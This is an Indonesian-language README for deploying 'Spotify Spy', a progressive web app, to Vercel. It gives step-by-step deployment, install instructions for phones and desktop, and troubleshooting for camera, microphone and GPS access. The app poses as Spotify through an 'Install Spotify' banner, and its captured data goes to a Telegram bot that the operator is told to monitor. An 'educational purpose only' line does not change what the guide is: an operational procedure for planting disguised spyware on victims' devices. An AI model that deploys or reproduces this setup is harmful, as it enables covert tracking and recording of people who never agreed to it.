# 🚀 Deploy Spotify Spy ke Vercel

## 📋 Cara Deploy

### **Metode 1: Vercel CLI (Recommended)**

```bash
# 1. Install Vercel CLI
npm install -g vercel

# 2. Login ke Vercel
vercel login

# 3. Deploy
cd d:\spotify-spy\vercel-deploy
vercel --prod
```

### **Metode 2: Vercel Website**

1. Buka https://vercel.com
2. Login/Sign up
3. Klik "**New Project**"
4. Pilih "**Import from Folder**" atau drag-drop folder `vercel-deploy`
5. Klik "**Deploy**"
6. Tunggu ~30 detik
7. Done! Dapat link: `https://your-app.vercel.app`

---

## 📱 Cara Install sebagai PWA

### **Android (Chrome):**
1. Buka link Vercel di Chrome
2. Tunggu banner "📲 Install Spotify" muncul
3. Klik banner
4. Klik "Install"
5. Done! Ikon muncul di home screen

### **iOS (Safari):**
1. Buka link Vercel di Safari
2. Tap tombol Share (⬆️)
3. Tap "Add to Home Screen"
4. Tap "Add"
5. Done!

### **Desktop:**
1. Buka link di Chrome/Edge
2. Klik ikon Install di address bar
3. Klik "Install"
4. Done!

---

## 📂 Files yang Di-deploy:

```
vercel-deploy/
├── index.html          ← Main app
├── manifest.json       ← PWA config
├── sw.js              ← Service Worker
├── icon-192.png       ← App icon (small)
├── icon-512.png       ← App icon (large)
├── vercel.json        ← Vercel config
└── README.md          ← This file
```

---

## ⚙️ Configuration

File `vercel.json` sudah dikonfigurasi untuk:
- ✅ Static file serving
- ✅ Service Worker support
- ✅ PWA manifest
- ✅ Image caching
- ✅ Security headers
- ✅ Camera/Mic permissions

---

## 🔧 Troubleshooting

### **Banner "Install" tidak muncul:**
- Pastikan buka di HTTPS (Vercel auto-HTTPS)
- Coba refresh halaman
- Atau pakai menu browser: ⋮ → "Add to Home screen"

### **Kamera/Mic tidak jalan:**
- Pastikan HTTPS enabled (Vercel auto)
- Allow permissions saat diminta browser
- Coba di real device (bukan emulator)

### **GPS tidak akurat:**
- Browser GPS kurang presisi vs native app
- Butuh permission "Allow location"
- Pastikan GPS device aktif

---

## 🎯 Custom Domain (Optional)

Jika punya custom domain:

1. Di Vercel dashboard → Settings → Domains
2. Add domain: `spotify.yourdomain.com`
3. Update DNS records sesuai instruksi Vercel
4. Done! App accessible via custom domain

---

## 📊 Monitoring

Setelah deploy:
- Cek logs: Vercel dashboard → Deployments → Logs
- Cek analytics: Vercel dashboard → Analytics
- Monitor Telegram bot untuk incoming data

---

## 🔐 Security Notes

⚠️ **PENTING:**
- Jangan share bot token publicly
- Gunakan environment variables untuk bot token (advanced)
- Jangan track orang tanpa consent
- Educational purpose only!

---

## ✅ Deploy Checklist:

- [ ] File index.html ready
- [ ] manifest.json configured
- [ ] Icons (192px & 512px) ready
- [ ] Service Worker (sw.js) ready
- [ ] vercel.json configured
- [ ] Telegram bot token valid
- [ ] Deploy to Vercel
- [ ] Test install on real device
- [ ] Test camera/mic permissions
- [ ] Verify Telegram integration

---

**Ready to deploy!** 🚀

Run: `vercel --prod`
